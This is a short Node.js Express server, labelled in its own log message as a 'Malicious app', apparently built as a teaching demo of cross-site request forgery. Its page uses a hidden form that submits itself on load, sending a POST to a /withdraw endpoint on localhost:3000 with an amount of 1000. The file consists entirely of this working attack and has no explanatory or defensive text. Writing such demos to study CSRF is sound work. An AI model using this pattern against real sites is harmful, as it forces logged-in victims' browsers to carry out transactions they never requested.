var express = require('express');

var app = express();

app.get('/', function (req, res) {
    res.send(`
    <body onload="document.forms[0].submit()">
    <form action="http://localhost:3000/withdraw" method="POST">
        <input type="hidden" name="amount" value="1000"/>
    </form>`);
});

app.listen(3001, () => console.log(`Malicious app listening on port 3001!`));
